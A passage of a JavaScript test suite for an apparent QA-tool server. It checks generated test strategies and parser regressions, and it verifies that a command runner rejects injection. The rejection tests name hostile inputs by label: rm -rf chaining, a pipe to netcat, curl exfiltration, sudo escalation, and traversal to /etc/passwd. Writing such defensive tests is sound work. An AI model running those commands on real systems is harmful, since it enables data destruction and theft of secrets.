  assertIncludes(out, "error envelope is consistent", "envelope test");
  assertIncludes(out, "node_modules", "internal-leak guard");
});

check("emits the universal contract checklist", () => {
  const out = text(get(100));
  assertIncludes(out, "UNIVERSAL CONTRACT CHECKLIST", "checklist");
  assertIncludes(out, "ISO 8601", "timestamp contract");
  assertIncludes(out, "idempotency", "idempotency contract");
});

check("pytest output uses Python comment and function syntax", () => {
  const out = text(get(101));
  assert(out.startsWith("# Framework"), "pytest header must use # comments");
  assert(/^def test_/m.test(out), "No pytest test functions");
  assert(!/^\/\/ Framework/m.test(out), "JS comment prefix leaked into pytest output");
});

check("playwright output uses the request fixture", () => {
  const out = text(get(102));
  assertIncludes(out, "@playwright/test", "playwright import");
  assertIncludes(out, "async ({ request })", "request fixture");
  assertIncludes(out, "response.status()", "status assertion");
});

check("degrades gracefully when no endpoints are present", () => {
  const response = get(103);
  assert(!isProtocolError(103), "Must not throw");
  assert(response.result?.isError !== true, "Absent endpoints is not an error condition");
  const out = text(response);
  assertIncludes(out, "No endpoints could be extracted", "explanatory message");
  assertIncludes(out, "UNIVERSAL CONTRACT CHECKLIST", "fallback checklist still useful");
});

check("missing apiSpec returns isError", () => {
  assert(!isProtocolError(104), "Must not be a protocol error");
  assert(isToolError(104), "Expected isError:true");
});

group("Tool 8 — generate_test_strategy");

check("detects domain, scale, and compliance from the context", () => {
  const out = text(get(110));
  assertIncludes(out, "e-commerce", "domain detection");
  assertIncludes(out, "multi-tenant SaaS", "domain detection");
  assertIncludes(out, "PCI DSS", "compliance detection");
  assertIncludes(out, "GDPR", "compliance detection");
  assertIncludes(out, "1200 rps", "scale detection");
});

check("applies all seven core testing principles", () => {
  const out = text(get(110));
  for (const principle of [
    "presence of defects",
    "Exhaustive testing is impossible",
    "shift-left",
    "Defect clustering",
    "pesticide paradox",
    "context-dependent",
    "Absence-of-errors fallacy",
  ]) {
    assertIncludes(out, principle, "core principle");
  }
});

check("allocates the test pyramid at 70/20/10", () => {
  const out = text(get(110));
  assertIncludes(out, "TEST PYRAMID ALLOCATION", "pyramid section");
  assertIncludes(out, "70%", "unit share");
  assertIncludes(out, "20%", "integration share");
  assertIncludes(out, "10%", "E2E share");
  assertIncludes(out, "inverted pyramid", "anti-pattern warning");
});

check("plans all six STLC phases", () => {
  const out = text(get(110));
  for (const phase of [
    "Requirement Analysis",
    "Test Planning",
    "Test Design",
    "Environment Setup",
    "Execution",
    "Cycle Closure",
  ]) {
    assertIncludes(out, phase, "STLC phase");
  }
});

check("plans every non-functional test type", () => {
  const out = text(get(110));
  for (const type of ["Load", "Stress", "Endurance (Soak)", "Spike", "Security / Pentest", "Accessibility", "Compatibility"]) {
    assertIncludes(out, type, "non-functional type");
  }
});

check("covers all three visibility levels and release validation phases", () => {
  const out = text(get(110));
  for (const level of ["Black-box", "White-box", "Grey-box"]) {
    assertIncludes(out, level, "visibility level");
  }
  for (const phase of ["Alpha", "Beta", "UAT"]) {
    assertIncludes(out, phase, "release phase");
  }
});

check("gives automate-vs-manual guidance and CI gating policy", () => {
  const out = text(get(110));
  assertIncludes(out, "Do not automate", "manual guidance");
  assertIncludes(out, "Exploratory testing", "non-automatable work");
  assertIncludes(out, "blocks the merge", "CI gating");
  assertIncludes(out, "Flaky tests are quarantined", "flake policy");
});

check("emits closure metrics and a residual risk statement", () => {
  const out = text(get(110));
  assertIncludes(out, "CLOSURE METRICS", "metrics section");
  assertIncludes(out, "Defect density", "metric");
  assertIncludes(out, "Defect escape rate", "metric");
  assertIncludes(out, "RESIDUAL RISK", "residual risk");
  assertIncludes(out, "does NOT cover", "honest limits");
});

check("risk profile changes the plan rather than relabelling it", () => {
  const prototype = text(get(111));
  const regulated = text(get(112));
  assertIncludes(prototype, "depth is deliberately traded for speed", "prototype tradeoff stated");
  assert(
    regulated.includes("Compliance evidence archived"),
    "regulated tier must add a compliance exit gate"
  );
  assert(
    !prototype.includes("Compliance evidence archived"),
    "prototype tier must not demand compliance sign-off"
  );
});

check("missing projectContext returns isError", () => {
  assert(!isProtocolError(113), "Must not be a protocol error");
  assert(isToolError(113), "Expected isError:true");
});

group("Regressions");

check("a length RANGE is not read as an exact length", () => {
  const out = text(get(120));
  const row = out.split("\n").find((l) => /^\|\s*\d+\s*\|\s*code\s/.test(l));
  assert(row, "code parameter row not found");
  assert(/minLength=6/.test(row), `expected minLength=6, got: ${row.trim()}`);
  assert(/maxLength=12/.test(row), `expected maxLength=12, got: ${row.trim()}`);
  assert(!/minLength=12/.test(row), "range tail wrongly used as the minimum");
});

check("range boundaries straddle both ends, not just the upper", () => {
  const out = text(get(120));
  for (const n of ["5", "6", "11", "12", "13"]) {
    assertIncludes(out, `<string of length ${n}>`, "range boundary case");
  }
});

check("an exact length is still read as exact", () => {
  const out = text(get(120));
  const row = out.split("\n").find((l) => /cardNumber/.test(l) && l.startsWith("|"));
  assert(/minLength=16/.test(row) && /maxLength=16/.test(row), `expected 16/16, got: ${row.trim()}`);
});

check("a length constraint outranks a numeric-sounding name", () => {
  const out = text(get(120));
  const row = out.split("\n").find((l) => /cardNumber/.test(l) && l.startsWith("|"));
  assert(
    /\|\s*string\s*\|/.test(row),
    `cardNumber must be a string (16 digits exceeds MAX_SAFE_INTEGER), got: ${row.trim()}`
  );
});

check("numeric fields without a length constraint stay numeric", () => {
  const out = text(get(10));
  const row = out.split("\n").find((l) => /seatCount/.test(l) && l.startsWith("|"));
  assert(/\|\s*number\s*\|/.test(row), `seatCount must stay a number, got: ${row.trim()}`);
});

check("'and' joining two actions splits into two steps", () => {
  const out = text(get(121));
  assertIncludes(out, "Steps     : 2 derived", "step count");
  assert(!/discountCodeSees/.test(out), "step boundary missed; locator names welded together");
  assertIncludes(out, "discount-code", "first step locator");
  assertIncludes(out, "reduced-total", "second step locator");
});

check("'and' inside a noun phrase does not split", () => {
  const out = text(get(122));
  assertIncludes(out, "Steps     : 1 derived", "terms and conditions must stay one step");
});

group("Parser coverage");

check("generic type parameters do not hide the argument list", () => {
  const out = text(get(130));
  assertIncludes(out, "url", "first parameter");
  assertIncludes(out, "limit", "second parameter");
});

check("a single-line class body yields its method parameters", () => {
  const out = text(get(131));
  assertIncludes(out, "sku", "first parameter");
  assertIncludes(out, "quantity", "second parameter");
});

check("a single-line interface yields its fields", () => {
  const out = text(get(132));
  for (const field of ["id", "items", "meta"]) {
    assertIncludes(out, field, "interface field");
  }
});

group("Windows shims");

check("a destructive token is caught through its .cmd shim", () => {
  assert(isToolError(133), "npm test rm.cmd must be rejected");
  assertIncludes(text(get(133)), "destructive_token", "rejection reason");
});

check("a destructive token is caught through its .exe shim", () => {
  assert(isToolError(134), "npm run sudo.exe must be rejected");
  assertIncludes(text(get(134)), "destructive_token", "rejection reason");
});

check("cmd.exe variable expansion is rejected", () => {
  assert(isToolError(135), "%PATH% must be rejected");
  assertIncludes(text(get(135)), "shell_metacharacter", "rejection reason");
});

check("cmd.exe escape character is rejected", () => {
  assert(isToolError(136), "^ must be rejected");
  assertIncludes(text(get(136)), "shell_metacharacter", "rejection reason");
});

group("Boundary consistency");

check("a minimum length rejects the empty string", () => {
  const out = text(get(140));
  const line = out.split("\n").find((l) => /^TC_\w+_\d+.*empty string/.test(l));
  assert(line, "no empty-string case emitted");
  assert(
    /rejected/.test(line),
    `minLength=6 but the empty string is not rejected: ${line.trim()}`
  );
});

check("a minimum length rejects a single character", () => {
  const out = text(get(140));
  const line = out.split("\n").find((l) => /^TC_\w+_\d+.*single character/.test(l));
  assert(line, "no single-character case emitted");
  assert(
    /rejected/.test(line),
    `minLength=6 but one character is not rejected: ${line.trim()}`
  );
});

check("boundary verdicts do not contradict each other", () => {
  const out = text(get(140));
  const verdict = (pattern) => {
    const l = out.split("\n").find((x) => new RegExp(`^TC_\\w+_\\d+.*${pattern}`).test(x));
    return l ? (/rejected/.test(l) ? "reject" : "accept") : null;
  };
  assert(verdict("empty string") === "reject", "empty must reject");
  assert(verdict("minLength - 1") === "reject", "below minimum must reject");
  assert(verdict("\\(minLength\\)") === "accept", "at minimum must accept");
});

check("an unconstrained string still accepts short input", () => {
  const out = text(get(141));
  assert(
    !/rejected at lower boundary \(single character\)/.test(out),
    "a field with no declared minimum must not reject a single character"
  );
});

check("module id uses a whole word, not a mid-word slice", () => {
  const out = text(get(140));
  assert(/TC_PROMO_001/.test(out), "expected TC_PROMO_001");
  assert(!/TC_PROMOCOD/.test(out), "module code truncated mid-word");
});

group("Negative — input validation");

for (const [id, label] of [
  [30, "generate_qa_matrix with no arguments"],
  [31, "parse_error_logs with no arguments"],
  [32, "run_local_test_suite with no arguments"],
  [34, "generate_qa_matrix with a non-string argument"],
]) {
  check(`${label} returns isError, not a protocol crash`, () => {
    assert(!isProtocolError(id), "Surfaced as a JSON-RPC protocol error (-32603)");
    assert(isToolError(id), "Expected isError:true");
    assertIncludes(text(get(id)), "Invalid input", "error message");
  });
}

check("invalid framework enum is rejected with the allowed list", () => {
  assert(isToolError(33), "Expected isError:true");
  const out = text(get(33));
  assertIncludes(out, "playwright", "allowed values");
  assertIncludes(out, "cypress", "allowed values");
});

check("unknown tool name returns a structured error", () => {
  assert(!isProtocolError(35), "Unknown tool must not be a protocol error");
  assert(isToolError(35), "Expected isError:true");
  assertIncludes(text(get(35)), "Unknown tool", "error message");
});

group("Negative — command injection");

const INJECTIONS = [
  [40, "semicolon chaining", "shell_metacharacter"],
  [41, "&& chaining with rm -rf", "shell_metacharacter"],
  [42, "pipe to netcat", "shell_metacharacter"],
  [43, "command substitution", "shell_metacharacter"],
  [44, "direct rm -rf", "disallowed_executable"],
  [45, "curl exfiltration", "disallowed_executable"],
  [46, "sudo escalation", "disallowed_executable"],
];

for (const [id, label, reason] of INJECTIONS) {
  check(`rejects ${label}`, () => {
    assert(!isProtocolError(id), "Must not surface as a protocol error");
    assert(isToolError(id), "Expected isError:true");
    const out = text(get(id));
    assertIncludes(out, "rejected", "rejection message");
    assertIncludes(out, reason, "rejection reason");
  });
}

check("injected payload was never executed (sentinel file absent)", () => {
  assert(
    !existsSync(SENTINEL),
    "CRITICAL: injected command executed — sentinel file was created"
  );
});

check("rejection happens before execution (no subprocess output leaked)", () => {
  const out = text(get(40));
  assert(!out.includes("Exit Code"), "Command was executed before the safety gate");
});

group("Negative — workspace boundary");

for (const [id, label] of [
  [50, "relative traversal (../../etc/passwd)"],
  [51, "absolute path outside the workspace (/etc/passwd)"],
  [52, "traversal inside a flag value (--reporter=../../../tmp/out)"],
]) {
  check(`blocks ${label}`, () => {
    assert(!isProtocolError(id), "Must not surface as a protocol error");
    assert(isToolError(id), "Expected isError:true");
    const out = text(get(id));
    assert(
      out.includes("workspace boundary") || out.includes("Blocked"),
      `Expected a workspace boundary rejection, got: ${out.slice(0, 160)}`
    );
  });
}

/* ── Report ─────────────────────────────────────────────────────────────── */

if (existsSync(SENTINEL)) rmSync(SENTINEL);

let lastGroup = "";
for (const r of results) {
  if (r.group !== lastGroup) {
    process.stdout.write(`\n  ${r.group}\n`);
    lastGroup = r.group;
  }
  process.stdout.write(
    r.ok ? `    PASS  ${r.name}\n` : `    FAIL  ${r.name}\n          ${r.error}\n`
  );
}

const failed = results.filter((r) => !r.ok);
process.stdout.write(
  `\n  ${results.length - failed.length}/${results.length} checks passed\n\n`
);

if (failed.length > 0) {
  process.stdout.write(`  ${failed.length} check(s) failed.\n\n`);
  process.exit(1);
}
